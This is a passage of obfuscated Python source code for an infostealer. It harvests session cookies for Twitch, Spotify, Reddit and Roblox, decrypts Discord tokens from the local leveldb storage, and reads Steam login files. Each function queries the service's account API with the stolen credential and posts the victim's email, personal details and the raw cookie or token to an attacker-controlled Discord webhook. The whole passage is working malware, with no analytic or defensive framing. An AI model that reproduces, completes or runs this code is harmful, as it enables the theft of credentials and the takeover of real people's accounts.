            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OOOOOOO0O0O0O0O0O :
                async with OOOOOOO0O0O0O0O0O .post (O0OOOOOO00O000OO0 ,headers =O0OOO0OOOOO0000OO ,json =OO00O0OOO0OOO0OOO )as O0OO000O000OOOO00 :
                    if O0OO000O000OOOO00 .status ==200 :
                        O0O0OO0000OO0OO0O =await O0OO000O000OOOO00 .json ()
            OO00O0OOO0OOO0OOO =O0O0OO0000OO0OO0O ["data"]["user"]
            O00O0O0000O0O00OO =OO00O0OOO0OOO0OOO ["id"]
            O0000OO000000OO00 =OO00O0OOO0OOO0OOO ["login"]
            O0OOOOOO0OO0O000O =f"https://www.twitch.tv/{O0000OO000000OO00}"
            O0O000O0OOOO000O0 =OO00O0OOO0OOO0OOO ["displayName"]
            OO000O000OOOO0OO0 =OO00O0OOO0OOO0OOO ["email"]
            OO0000O000000000O =OO00O0OOO0OOO0OOO ["hasPrime"]
            O00O00OOOO00OOO0O =OO00O0OOO0OOO0OOO ["isPartner"]
            OOO0OOO0OO00O000O =OO00O0OOO0OOO0OOO ["language"]
            O000OO00O0000OOO0 ='Shit'
            try :
                O000OO00O0000OOO0 =OO00O0OOO0OOO0OOO ["profileImageURL"]
            except :pass
            O00O000OOO0O00000 =OO00O0OOO0OOO0OOO ["bitsBalance"]
            OO0O0OO0O00O0OOOO =OO00O0OOO0OOO0OOO ["followers"]["totalCount"]
            OO00O0OOO0O0000OO ={"title":"***Shit***","description":f"***Twitch Session was detected on the {OO0O00OOO0O00OOOO} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":O000OO00O0000OOO0 }}
            O0OO00000OOO00OO0 =[{"name":"Username","value":"``"+str (O0000OO000000OO00 )+"``","inline":True },{"name":"Display Name","value":"``"+str (O0O000O0OOOO000O0 )+"``","inline":True },{"name":"Email","value":"``"+str (OO000O000OOOO0OO0 )+"``","inline":True },{"name":"ID","value":"``"+str (O00O0O0000O0O00OO )+"``","inline":True },{"name":"Has Prime?","value":"``"+str (OO0000O000000000O )+"``","inline":True },{"name":"is Partner?","value":"``"+str (O00O00OOOO00OOO0O )+"``","inline":True },{"name":"Language","value":"``"+str (OOO0OOO0OO00O000O )+"``","inline":True },{"name":"Bit","value":"``"+str (O00O000OOO0O00000 )+"``","inline":True },{"name":"Followers","value":"``"+str (OO0O0OO0O00O0OOOO )+"``","inline":True },{"name":"Profile URL","value":"``"+str (O0OOOOOO0OO0O000O )+"``","inline":False },{"name":"Cookie","value":"``"+str (O0000000OOOOO0O00 )+"``","inline":False },]
            OO00O0OOO0O0000OO ["fields"]=O0OO00000OOO00OO0
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OOOOOOO0O0O0O0O0O :
                O00O000O0OO0OO00O ={"username":"Shit","embeds":[OO00O0OOO0O0000OO ]}
                O0OOO0OOOOO0000OO ={"Content-Type":"application/json"}
                async with OOOOOOO0O0O0O0O0O .post (webhook ,json =O00O000O0OO0OO00O ,headers =O0OOO0OOOOO0000OO )as O0OO000O000OOOO00 :
                    pass
        except :
            pass
        else :
            Variables .TwtichAccounts .append (f"Cookie : {O0000000OOOOO0O00}\nProfile URL : {O0OOOOOO0OO0O000O}\nID : {O00O0O0000O0O00OO}\nUsername : {O0000OO000000OO00}\nDisplay Name : {O0O000O0OOOO000O0}\nEmail : {OO000O000OOOO0OO0}\nHas Prime : {OO0000O000000000O}\nis Partner : {O00O00OOOO00OOO0O}\nLanguage : {OOO0OOO0OO00O000O}\nBits : {O00O000OOO0O00000}\nFollowers : {OO0O0OO0O00O0OOOO}\n======================================================================\n")
    async def SpotifySession (O0OO000OO00OOO000 ,O0O0OO00O000OOOO0 ,OOOO00OO0000000O0 :str )->None :
        try :
            O00O0OO0O0000O00O ='https://www.spotify.com/api/account-settings/v1/profile'
            O000O00000OO00OO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36','Cookie':(f'sp_dc={O0O0OO00O000OOOO0}')}
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OOOO0O00OO0000OO0 :
                async with OOOO0O00OO0000OO0 .get (O00O0OO0O0000O00O ,headers =O000O00000OO00OO0 )as OOOOO0O000OOO0OOO :
                    OO0000O00O0000000 =await OOOOO0O000OOO0OOO .text ()
                    OO0000O00O0000000 =json .loads (OO0000O00O0000000 )["profile"]
            O000O000OO000O0O0 =OO0000O00O0000000 ["email"]
            OOOO0O0OO0OO0O00O =OO0000O00O0000000 ["gender"]
            O00OOOOOO0O0OOO0O =OO0000O00O0000000 ["birthdate"]
            O000OO0OO0O000OO0 =OO0000O00O0000000 ["country"]
            OO0O0000OO0O000OO =OO0000O00O0000000 ["username"]
            OO00OOO0O000OO00O ={"title":"***Shit***","description":f"***Spotify Session was detected on the {OOOO00OO0000000O0} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":"Shit"}}
            OO00O0OO00O0O000O =[{"name":"Email","value":"``"+str (O000O000OO000O0O0 )+"``","inline":True },{"name":"Username","value":"``"+str (OO0O0000OO0O000OO )+"``","inline":True },{"name":"Gender","value":"``"+str (OOOO0O0OO0OO0O00O )+"``","inline":True },{"name":"birthdate","value":"``"+str (O00OOOOOO0O0OOO0O )+"``","inline":True },{"name":"country","value":"``"+str (O000OO0OO0O000OO0 )+"``","inline":True },{"name":"Profile URL","value":"``"+str (f'https://open.spotify.com/user/{OO0O0000OO0O000OO}')+"``","inline":False },{"name":"Spotify Cookie","value":"``"+str (O0O0OO00O000OOOO0 )+"``","inline":False },]
            OO00OOO0O000OO00O ["fields"]=OO00O0OO00O0O000O
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OOOO0O00OO0000OO0 :
                O00OOO0OOO00OOOOO ={"username":"Shit","embeds":[OO00OOO0O000OO00O ]}
                O000O00000OO00OO0 ={"Content-Type":"application/json"}
                async with OOOO0O00OO0000OO0 .post (webhook ,json =O00OOO0OOO00OOOOO ,headers =O000O00000OO00OO0 )as OOOOO0O000OOO0OOO :
                    pass
        except :
            pass
        else :
            Variables .SpotifyAccounts .append (f"Cookie : {O0O0OO00O000OOOO0}\nProfile URL : https://open.spotify.com/user/{OO0O0000OO0O000OO}\nEmail : {O000O000OO000O0O0}\nUsername : {username}\nGender : {OOOO0O0OO0OO0O00O}\nBirthdate : {O00OOOOOO0O0OOO0O}\nCountry : {O000OO0OO0O000OO0}\n======================================================================\n")
    async def RedditSession (O00O000000OO00OO0 ,OOOOOOOOOOO0OO0O0 ,OOO00O0OO0OOOOO00 :str )->None :
        try :
            OO0O00O0O0OOOOOOO =""
            O00OO00O000OO00O0 ="reddit_session="+OOOOOOOOOOO0OO0O0
            O00O00OOO00OOOOOO ={"cookie":O00OO00O000OO00O0 ,"Authorization":"Basic b2hYcG9xclpZdWIxa2c6"}
            O000000O0O0O0O0O0 ={"scopes":["*","email","pii"]}
            OOOOOOOOO00OO0000 ='https://accounts.reddit.com/api/access_token'
            OO00OO0O00OOO0000 ='https://oauth.reddit.com/api/v1/me'
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO000OOOO0O00O00O :
                async with OO000OOOO0O00O00O .post (OOOOOOOOO00OO0000 ,headers =O00O00OOO00OOOOOO ,json =O000000O0O0O0O0O0 )as OO00OO0O000O00OO0 :
                    O0OOO0OO00OO00000 =await OO00OO0O000O00OO0 .json ()
                    OOOOO0O0O0OOOO00O =O0OOO0OO00OO00000 ["access_token"]
                    OOOO0O0OOO00OO0O0 ={'User-Agent':'android:com.example.myredditapp:v1.2.3',"Authorization":"Bearer "+OOOOO0O0O0OOOO00O }
                    async with OO000OOOO0O00O00O .get (OO00OO0O00OOO0000 ,headers =OOOO0O0OOO00OO0O0 )as OOO0OOOO0O0000O00 :
                        O0OOOO000OOOOOO0O =await OOO0OOOO0O0000O00 .json ()
                    if O0OOOO000OOOOOO0O ["email"]=="":
                        OO0O00O0O0OOOOOOO ="No email"
                    else :
                        OO0O00O0O0OOOOOOO =O0OOOO000OOOOOO0O ["email"]
                    OO00OO0OOO000000O =O0OOOO000OOOOOO0O ["icon_img"]
                    O0000OOO00OO000O0 =O0OOOO000OOOOOO0O ["name"]
                    OO0000O00OO00000O ='https://www.reddit.com/user/'+O0000OOO00OO000O0
                    O00OO000O0000OOO0 =O0OOOO000OOOOOO0O ["comment_karma"]
                    OO000000OOO0O000O =O0OOOO000OOOOOO0O ["total_karma"]
                    O00O000O0O0O00O00 =O0OOOO000OOOOOO0O ["coins"]
                    OOO0OOO0O0000000O =O0OOOO000OOOOOO0O ["is_mod"]
                    OOO0O0000OO0O0O00 =O0OOOO000OOOOOO0O ["is_gold"]
                    OO0O0O00O0O00O00O =O0OOOO000OOOOOO0O ["is_suspended"]
            O0000O0O000O000OO ={"title":"***Shit***","description":f"***Reddit Session was detected on the {OOO00O0OO0OOOOO00} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":OO00OO0OOO000000O }}
            OO00OOO000O0O00OO =[{"name":"Username","value":"``"+str (O0000OOO00OO000O0 )+"``","inline":True },{"name":"Email","value":"``"+str (OO0O00O0O0OOOOOOO )+"``","inline":True },{"name":"Comment Karma","value":"``"+str (O00OO000O0000OOO0 )+"``","inline":True },{"name":"Total Karma","value":"``"+str (OO000000OOO0O000O )+"``","inline":True },{"name":"Coins","value":"``"+str (O00O000O0O0O00O00 )+"``","inline":True },{"name":"Is Mod","value":"``"+str (OOO0OOO0O0000000O )+"``","inline":True },{"name":"Is Gold","value":"``"+str (OOO0O0000OO0O0O00 )+"``","inline":True },{"name":"Suspended","value":"``"+str (OO0O0O00O0O00O00O )+"``","inline":True },{"name":"Profile URL","value":"``"+str (OO0000O00OO00000O )+"``","inline":False },{"name":"Cookie","value":"``"+str (OOOOOOOOOOO0OO0O0 )+"``","inline":False },]
            O0000O0O000O000OO ["fields"]=OO00OOO000O0O00OO
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO000OOOO0O00O00O :
                OO00O0OOOOOOO0O0O ={"username":"Shit","embeds":[O0000O0O000O000OO ]}
                O00O00OOO00OOOOOO ={"Content-Type":"application/json"}
                async with OO000OOOO0O00O00O .post (webhook ,json =OO00O0OOOOOOO0O0O ,headers =O00O00OOO00OOOOOO )as O0OOO0OO00OO00000 :
                    pass
        except :
            pass
        else :
            Variables .RedditAccounts .append (f"Cookie : {O00OO00O000OO00O0}\nProfile URL : {OO0000O00OO00000O}\nUsername : {O0000OOO00OO000O0}\nEmail : {OO0O00O0O0OOOOOOO}\nComment Karma : {O00OO000O0000OOO0}\nTotal Karma : {OO000000OOO0O000O}\nis Mod : {OOO0OOO0O0000000O}\nis Gold : {OOO0O0000OO0O0O00}\nSuspended : {OO0O0O00O0O00O00O}\n======================================================================\n")
    async def RobloxSession (OOO0OOO0OOO0O0O00 ,OO0OOOO0OO0OO00OO ,O00O00O0OOO0O00OO :str )->None :
        try :
            O00O000O0OOO000OO ={'cookie':f'.ROBLOSECURITY={OO0OOOO0OO0OO00OO}',"Accept-Encoding":"identity"}
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO0OO0OO0000OO0O0 :
                async with OO0OO0OO0000OO0O0 .get ("https://www.roblox.com/my/account/json",headers =O00O000O0OOO000OO )as OO00OOO000OO0OOO0 :
                    OO00OOOOO00O00O0O =await OO00OOO000OO0OOO0 .json ()
                async with OO0OO0OO0000OO0O0 .get (f"https://economy.roblox.com/v1/users/{str(OO00OOOOO00O00O0O['UserId'])}/currency",headers =O00O000O0OOO000OO )as O0O0000OO0O00OO0O :
                    O000O00O00OO0O0O0 =await O0O0000OO0O00OO0O .json ()
                async with OO0OO0OO0000OO0O0 .get (f"https://thumbnails.roblox.com/v1/users/avatar?userIds={str(OO00OOOOO00O00O0O['UserId'])}&size=420x420&format=Png&isCircular=false",headers =O00O000O0OOO000OO )as OO0OO0OO000O00OOO :
                    O00000O00O00OOOOO =await OO0OO0OO000O00OOO .json ()
                O00OOO000O00OO000 =OO00OOOOO00O00O0O ["UserId"]
                O00OO00O0O00O00OO =OO00OOOOO00O00O0O ["Name"]
                OO0O0O0OO00O00OO0 =OO00OOOOO00O00O0O ["DisplayName"]
                OOOO00OOO00OO0OO0 =OO00OOOOO00O00O0O ["UserEmail"]
                OOOO0O0OO0OO0OOO0 =OO00OOOOO00O00O0O ["IsEmailVerified"]
                OO0000OOO00OOOOO0 =O000O00O00OO0O0O0 ["robux"]
                OO0O0O000O00O00OO =O00000O00O00OOOOO ["data"][0 ]["imageUrl"]
                OOOOO0OO000O000O0 ={"title":"***Shit***","description":f"***Roblox Session was detected on the {O00O00O0OOO0O00OO} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":OO0O0O000O00O00OO }}
                O00OO00O00O0O0OOO =[{"name":"Name","value":"``"+str (O00OO00O0O00O00OO )+"``","inline":True },{"name":"Display Name","value":"``"+str (OO0O0O0OO00O00OO0 )+"``","inline":True },{"name":"Email","value":"``"+str (OOOO00OOO00OO0OO0 )+"``","inline":True },{"name":"ID","value":"``"+str (O00OOO000O00OO000 )+"``","inline":True },{"name":"Email Verified?","value":"``"+str (OOOO0O0OO0OO0OOO0 )+"``","inline":True },{"name":"robux","value":"``"+str (OO0000OOO00OOOOO0 )+"``","inline":True },{"name":"Cookie","value":"```"+str (OO0OOOO0OO0OO00OO )+"```","inline":True },]
                OOOOO0OO000O000O0 ["fields"]=O00OO00O00O0O0OOO
                O0OO00OOO0O00O00O ={"username":"Shit","embeds":[OOOOO0OO000O000O0 ]}
                OOO000OO0O0O000OO ={"Content-Type":"application/json"}
                async with OO0OO0OO0000OO0O0 .post (webhook ,json =O0OO00OOO0O00O00O ,headers =OOO000OO0O0O000OO )as OO00OOO000OO0OOO0 :
                    pass
        except :
            pass
        else :
            Variables .RobloxAccounts .append (f"Name : {str(O00OO00O0O00O00OO)}\nDisplay Name : {str(OO0O0O0OO00O00OO0)}\nEmail : {str(OOOO00OOO00OO0OO0)}\nID : {str(O00OOO000O00OO000)}\nEmail Verified : {str(OOOO0O0OO0OO0OOO0)}\nRobux : {str(OO0000OOO00OOOOO0)}\nCookie : {OO0OOOO0OO0OO00OO}\n======================================================================\n")
    async def GetTokens (O0OO00OO0O0OO00O0 )->None :
        try :
            OOO000O0O0O0000O0 ={"Discord":os .path .join (O0OO00OO0O0OO00O0 .RoamingAppData ,"discord","Local Storage","leveldb"),"Discord Canary":os .path .join (O0OO00OO0O0OO00O0 .RoamingAppData ,"discordcanary","Local Storage","leveldb"),"Lightcord":os .path .join (O0OO00OO0O0OO00O0 .RoamingAppData ,"Lightcord","Local Storage","leveldb"),"Discord PTB":os .path .join (O0OO00OO0O0OO00O0 .RoamingAppData ,"discordptb","Local Storage","leveldb"),}
            OO0OOO000O0OOOOOO =list ()
            for O00O0O0O0OOOO00O0 ,OO0O000OO0OO0O00O in OOO000O0O0O0000O0 .items ():
                if os .path .isdir (OO0O000OO0OO0O00O ):
                    OO0OOO000O0OOOOOO .append (OO0O000OO0OO0O00O )
            for O000O0OO00OO0O0O0 in O0OO00OO0O0OO00O0 .profiles_full_path :
                if not O000O0OO00OO0O0O0 .endswith ("leveldb"):
                    OO00OO000OO00OO00 =os .path .join (O000O0OO00OO0O0O0 ,"Local Storage","leveldb")
                    if os .path .isdir (OO00OO000OO00OO00 ):
                        OO0OOO000O0OOOOOO .append (OO00OO000OO00OO00 )
            for OO00O00O0OOOO00OO in OO0OOO000O0OOOOOO :
                OOO0OOO00000OOOOO =Variables .FullTokens
                if "cord"in OO00O00O0OOOO00OO :
                    O000000OOO0OOO0OO =SubModules .GetKey (OO00O00O0OOOO00OO .replace (r"Local Storage\leveldb","Local State"))
                    for OOO0OOO0O0OO00O00 in os .listdir (OO00O00O0OOOO00OO ):
                        OO0O0O0OO0O0O00O0 =os .path .join (OO00O00O0OOOO00OO ,OOO0OOO0O0OO00O00 )
                        if OO0O0O0OO0O0O00O0 [-3 :]in ["log","ldb"]:
                            with open (OO0O0O0OO0O0O00O0 ,"r",encoding ="utf-8",errors ="ignore")as O00OO0O000OO00OO0 :
                                for O00OOOOO00O0O000O in re .findall (r"dQw4w9WgXcQ:[^\"]*",O00OO0O000OO00OO0 .read ()):#line:1212
                                    if O00OOOOO00O0O000O :
                                        OOOO0OO000O0O0OOO =base64 .b64decode (O00OOOOO00O0O000O .split ("dQw4w9WgXcQ:")[1 ])
                                        OO0000OO00OO000OO =SubModules .Decrpytion (OOOO0OO000O0O0OOO ,O000000OOO0OOO0OO )
                                        if not OO0000OO00OO000OO in OOO0OOO00000OOOOO :
                                            OOO0OOO00000OOOOO .append (OO0000OO00OO000OO )
                                            await O0OO00OO0O0OO00O0 .ValidateTokenAndGetInfo (OO0000OO00OO000OO )
                                        else :
                                            continue
                else :
                    for O000O0OO00OO0O0O0 in os .listdir (OO00O00O0OOOO00OO ):
                        OOOOO00000O0O0OOO =os .path .join (OO00O00O0OOOO00OO ,O000O0OO00OO0O0O0 )
                        if OOOOO00000O0O0OOO [-3 :]in ["log","ldb"]:
                            with open (OOOOO00000O0O0OOO ,"r",encoding ="utf-8",errors ="ignore")as OOOO000OO0OO00O0O :
                                for O0O00O0OO0OO0000O in re .findall (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",OOOO000OO0OO00O0O .read ()):
                                    if O0O00O0OO0OO0000O :
                                        if not O0O00O0OO0OO0000O in OOO0OOO00000OOOOO :
                                            OOO0OOO00000OOOOO .append (O0O00O0OO0OO0000O )
                                            await O0OO00OO0O0OO00O0 .ValidateTokenAndGetInfo (O0O00O0OO0OO0000O )
                                        else :
                                            continue
        except :
            pass
    def calc_flags (OOOO000O0000O0O00 ,OOO00O0O0O00OOOO0 :int )->list :
        O0O00O00O000OO0O0 ={"DISCORD_EMPLOYEE":{"emoji":"<:staff:968704541946167357>","shift":0 ,"ind":1 },"DISCORD_PARTNER":{"emoji":"<:partner:968704542021652560>","shift":1 ,"ind":2 },"HYPESQUAD_EVENTS":{"emoji":"<:hypersquad_events:968704541774192693>","shift":2 ,"ind":4 },"BUG_HUNTER_LEVEL_1":{"emoji":"<:bug_hunter_1:968704541677723648>","shift":3 ,"ind":4 },"HOUSE_BRAVERY":{"emoji":"<:hypersquad_1:968704541501571133>","shift":6 ,"ind":64 },"HOUSE_BRILLIANCE":{"emoji":"<:hypersquad_2:968704541883261018>","shift":7 ,"ind":128 },"HOUSE_BALANCE":{"emoji":"<:hypersquad_3:968704541874860082>","shift":8 ,"ind":256 },"EARLY_SUPPORTER":{"emoji":"<:early_supporter:968704542126510090>","shift":9 ,"ind":512 },"BUG_HUNTER_LEVEL_2":{"emoji":"<:bug_hunter_2:968704541774217246>","shift":14 ,"ind":16384 },"VERIFIED_BOT_DEVELOPER":{"emoji":"<:verified_dev:968704541702905886>","shift":17 ,"ind":131072 },"ACTIVE_DEVELOPER":{"emoji":"<:Active_Dev:1045024909690163210>","shift":22 ,"ind":4194304 },"CERTIFIED_MODERATOR":{"emoji":"<:certified_moderator:988996447938674699>","shift":18 ,"ind":262144 },"SPAMMER":{"emoji":"⌨","shift":20 ,"ind":1048704 },}
        return [[O0O00O00O000OO0O0 [O00OO0000O000OO0O ]['emoji'],O0O00O00O000OO0O0 [O00OO0000O000OO0O ]['ind']]for O00OO0000O000OO0O in O0O00O00O000OO0O0 if int (OOO00O0O0O00OOOO0 )&(1 <<O0O00O00O000OO0O0 [O00OO0000O000OO0O ]["shift"])]
    def calc_flags2 (O0OO00OO0O00OO0O0 ,OO0O0OO000O0OOOOO :int )->list :
        O00000OOOOO000OO0 ={"DISCORD_EMPLOYEE":{"emoji":"<:staff:968704541946167357>","shift":0 ,"ind":1 },"DISCORD_PARTNER":{"emoji":"<:partner:968704542021652560>","shift":1 ,"ind":2 },"BUG_HUNTER_LEVEL_1":{"emoji":"<:bug_hunter_1:968704541677723648>","shift":3 ,"ind":4 },"EARLY_SUPPORTER":{"emoji":"<:early_supporter:968704542126510090>","shift":9 ,"ind":512 },"VERIFIED_BOT_DEVELOPER":{"emoji":"<:verified_dev:968704541702905886>","shift":17 ,"ind":131072 },"ACTIVE_DEVELOPER":{"emoji":"<:active_dev:1045024909690163210>","shift":22 ,"ind":4194304 },"CERTIFIED_MODERATOR":{"emoji":"<:certified_moderator:988996447938674699>","shift":18 ,"ind":262144 },"SPAMMER":{"emoji":"⌨","shift":20 ,"ind":1048704 },}
        return [[O00000OOOOO000OO0 [O00O0OO00OO0OOO0O ]['emoji'],O00000OOOOO000OO0 [O00O0OO00OO0OOO0O ]['ind']]for O00O0OO00OO0OOO0O in O00000OOOOO000OO0 if int (OO0O0OO000O0OOOOO )&(1 <<O00000OOOOO000OO0 [O00O0OO00OO0OOO0O ]["shift"])]
    async def ValidateTokenAndGetInfo (O0000OO0O0OOOOOOO ,O0OOOO0OOO0OO000O :str )->None :
        try :
            OO00OO000OO000O00 ={'Authorization':O0OOOO0OOO0OO000O }
            OOO0OOO0OOO00000O ='https://discord.com/api/v8/users/@me'
            O0OO00O0OO00000OO ='https://discord.com/api/v8/users/@me/relationships'
            OO0000O0OOO00OO00 =None
            async with aiohttp .ClientSession ()as OO0O0O0O0O000O0OO :
                async with OO0O0O0O0O000O0OO .get (OOO0OOO0OOO00000O ,headers =OO00OO000OO000O00 )as OOO000OOO000000OO :
                    if OOO000OOO000000OO .status ==200 :
                        Variables .ValidatedTokens .append (O0OOOO0OOO0OO000O )
                        O000O0O0OOOO000OO =await OOO000OOO000000OO .json ()
                        O0000OOOO0OO0OOOO =O000O0O0OOOO000OO .get ("avatar","")
                        OOO0OOO00OOOOO000 =O000O0O0OOOO000OO .get ('public_flags',[])
                        O000OOO00O0O0OOO0 =' '.join ([O000000000000OOOO [0 ]for O000000000000OOOO in O0000OO0O0OOOOOOO .calc_flags (OOO0OOO00OOOOO000 )])
                        OOO00OO0OOOOOOO0O =O000O0O0OOOO000OO .get ("premium_type","")
                        if O0000OOOO0OO0OOOO :
                            async with OO0O0O0O0O000O0OO .get (f"https://cdn.discordapp.com/avatars/{O000O0O0OOOO000OO['id']}/{O0000OOOO0OO0OOOO}.png",headers =OO00OO000OO000O00 )as O0OOOOOOO0000OOO0 :
                                if O0OOOOOOO0000OOO0 .status ==200 :
                                    OO0000O0OOO00OO00 =f"https://cdn.discordapp.com/avatars/{O000O0O0OOOO000OO['id']}/{O0000OOOO0OO0OOOO}.png"
                                else :
                                    OO0000O0OOO00OO00 =f"https://cdn.discordapp.com/avatars/{O000O0O0OOOO000OO['id']}/{O0000OOOO0OO0OOOO}.gif"
                        async with OO0O0O0O0O000O0OO .get (O0OO00O0OO00000OO ,headers =OO00OO000OO000O00 )as OO0OO00OOO0OOO00O :
                            OO0O0O0O0O00000O0 =await OO0OO00OOO0OOO00O .json ()
                    else :
                        return
            OOO0O0O0OO0OOO000 ="No Nitro"
            try :
                if OOO00OO0OOOOOOO0O ==0 :
                    OOO0O0O0OO0OOO000 ='None'
                elif OOO00OO0OOOOOOO0O ==1 :
                    OOO0O0O0OO0OOO000 ='Nitro Classic'
                elif OOO00OO0OOOOOOO0O ==2 :
                    OOO0O0O0OO0OOO000 ='Nitro'
                elif OOO00OO0OOOOOOO0O ==3 :
                    OOO0O0O0OO0OOO000 ='Nitro Basic'
                else :
                    OOO0O0O0OO0OOO000 ='None'
            except :
                pass
            O0000OO0O0OOOOO0O =[]
            try :
                if OO0O0O0O0O00000O0 :
                    for OO0OOOOOO0O0000OO in OO0O0O0O0O00000O0 :
                        O00O0O0O0O0O00O00 =[64 ,128 ,256 ,1048704 ]
                        O0OOOOO0OOO00OO0O =[O000O0OOOOO0O0OO0 [1 ]for O000O0OOOOO0O0OO0 in O0000OO0O0OOOOOOO .calc_flags2 (OO0OOOOOO0O0000OO ['user']['public_flags'])[::-1 ]]
                        for O0OO0000OOO0O000O in O00O0O0O0O0O00O00 :
                            O0OOOOO0OOO00OO0O .remove (O0OO0000OOO0O000O )if O0OO0000OOO0O000O in O0OOOOO0OOO00OO0O else None
                        if O0OOOOO0OOO00OO0O !=[]:
                            OO0O00OOO0000OO00 =' '.join ([OOOOO0OO00O000O00 [0 ]for OOOOO0OO00O000O00 in O0000OO0O0OOOOOOO .calc_flags2 (OO0OOOOOO0O0000OO ['user']['public_flags'])[::-1 ]])
                            O0O0000OOOO00O0OO =f"{OO0O00OOO0000OO00} - ``{OO0OOOOOO0O0000OO['user']['username']}
                            if len ('\n'.join (O0000OO0O0OOOOO0O ))+len (O000O0O0OOOO000OO )>=1024 :
                                break
                            O0000OO0O0OOOOO0O .append (O0O0000OOOO00O0OO )
                            if len (O0000OO0O0OOOOO0O )>0 :
                                O0000OO0O0OOOOO0O ='\n'.join (O0000OO0O0OOOOO0O )
            except :
                pass
            if O000O0O0OOOO000OO :
                OOOO0OO0O0O000000 ={"title":"***Shit***","description":f"***Validated Discord Token Detected***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":""}}
                if OO0000O0OOO00OO00 :
                    OOOO0OO0O0O000000 ["thumbnail"]["url"]=OO0000O0OOO00OO00
                O0O00O0O000O0OOO0 =str (O000O0O0OOOO000OO ['bio'])
                O0O00O0O000O0OOO0 =O0O00O0O000O0OOO0 .replace ("\n",", ")
                O0O0O00OO0OOO000O =[{"name":"Token","value":"``"+str (O0OOOO0OOO0OO000O )+"``","inline":False },{"name":"Username","value":"``"+str (f'{O000O0O0OOOO000OO["username"]}
                if O0000OO0O0OOOOO0O :
                    try :
                        O0O0O00OO0OOO000O .append ({"name":"Hq Friends","value":O0000OO0O0OOOOO0O ,"inline":False },)
                    except :
                        pass
                OOOO0OO0O0O000000 ["fields"]=O0O0O00OO0OOO000O
                async with aiohttp .ClientSession ()as OO0O0O0O0O000O0OO :
                    OOOOOO0OO00OO00OO ={"username":"Shit","embeds":[OOOO0OO0O0O000000 ]}
                    OO00OO000OO000O00 ={"Content-Type":"application/json"}
                    async with OO0O0O0O0O000O0OO .post (webhook ,json =OOOOOO0OO00OO00OO ,headers =OO00OO000OO000O00 )as OOO000OOO000000OO :
                        pass
                Variables .DiscordAccounts .append (f"Username : {O000O0O0OOOO000OO['username']}
        except Exception :
            pass
    async def GetSteamSession (O00OOO0O000OOO00O )->None :
        try :
            O0000O00OO0OOO0OO =[]
            for O0000OO000O0O00OO in range (ord ('A'),ord ('Z')+1 ):
                OO000O0O0O0O00OO0 =chr (O0000OO000O0O00OO )
                if os .path .exists (OO000O0O0O0O00OO0 +':\\'):
                    O0000O00OO0OOO0OO .append (OO000O0O0O0O00OO0 )
            for O00OOO0000O00O00O in O0000O00OO0OOO0OO :
                O00OOO0000O00O00O =os .path .join (O00OOO0000O00O00O +":\\","Program Files (x86)","Steam","config","loginusers.vdf")
                if os .path .isfile (O00OOO0000O00O00O ):
                    with open (O00OOO0000O00O00O ,"r",encoding ="utf-8",errors ="ignore")as O0OOO0O00O00O0000 :
                        O0OO00OO0OOOOO0OO ="".join (re .findall (r"7656[0-9]{13}",O0OOO0O00O00O0000 .read ()))
                        if O0OO00OO0OOOOO0OO :
                            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO000O00O000OO00O :
                                OO0OOO0O0OO0000OO ="https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids="+O0OO00OO0OOOOO0OO
                                OOOOO00O0OOOO0000 ="https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid="+O0OO00OO0OOOOO0OO
                                async with OO000O00O000OO00O .get (OO0OOO0O0OO0000OO )as OO00OOO0OO0O0OO00 :
                                    O00OOO0OOOOO0O0OO =await OO00OOO0OO0O0OO00 .json ()
                                async with OO000O00O000OO00O .get (OOOOO00O0OOOO0000 )as O000O00O00O000O00 :
                                    OO00OO0OO00OOO0O0 =await O000O00O00O000O00 .json ()
                                O0O0O00OO0OOOOOO0 =O00OOO0OOOOO0O0OO ["response"]["players"][0 ]
                                OOO0OO0O0O0OOO0OO =O0O0O00OO0OOOOOO0 ["personaname"]
                                O0O00OOOO0O00OO0O =O0O0O00OO0OOOOOO0 ["profileurl"]
                                OOO00OOO0O0OOOOO0 =O0O0O00OO0OOOOOO0 ["avatarfull"]
                                OOO0O00O0O00OOO0O =O0O0O00OO0OOOOOO0 ["timecreated"]
                                if O0O0O00OO0OOOOOO0 ["realname"]:
                                    OO0OO00O0O00O00O0 =O0O0O00OO0OOOOOO0 ["realname"]
                                else :OO0OO00O0O00O00O0 ="None"
                                O0OO000OOO00O000O =OO00OO0OO00OOO0O0 ["response"]["player_level"]
                                O0000OO0OOO000OOO ={"title":"***Shit***","description":f"***Steam Session Detected***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":OOO00OOO0O0OOOOO0 }}
                                OO00OOOO000O0OOO0 =[{"name":"Username","value":"``"+str (OOO0OO0O0O0OOO0OO )+"``","inline":True },{"name":"Realname","value":"``"+str (OO0OO00O0O00O00O0 )+"``","inline":True },{"name":"ID","value":"``"+str (O0OO00OO0OOOOO0OO )+"``","inline":True },{"name":"Timecreated","value":"``"+str (OOO0O00O0O00OOO0O )+"``","inline":True },{"name":"Player Level","value":"``"+str (O0OO000OOO00O000O )+"``","inline":True },{"name":"Profile URL","value":"``"+str (O0O00OOOO0O00OO0O )+"``","inline":True },]
                                O0000OO0OOO000OOO ["fields"]=OO00OOOO000O0OOO0
